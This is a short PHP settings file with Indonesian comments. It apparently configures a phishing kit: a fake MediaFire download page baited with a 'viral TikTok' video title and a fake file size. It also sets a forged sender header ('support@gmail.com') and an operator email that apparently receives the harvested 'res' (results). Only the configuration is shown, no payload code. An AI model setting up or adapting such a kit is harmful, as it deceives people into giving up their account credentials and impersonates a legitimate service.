<?php
/* UBAH SESUKA MU */

$namawebpmu = 'Riffa & Atta TikTok Viral'; // NAMA WEB FILE MEDIAFIRE MU
$ukurandownload = '3.97MB'; // KB, MB

$sender = 'From: UNCHEK GEGE <support@gmail.com>'; // UBAH NAMA RESS MU
$emailku = 'emailmu@gmail.com'; // UBAH EMAIL MU

?>
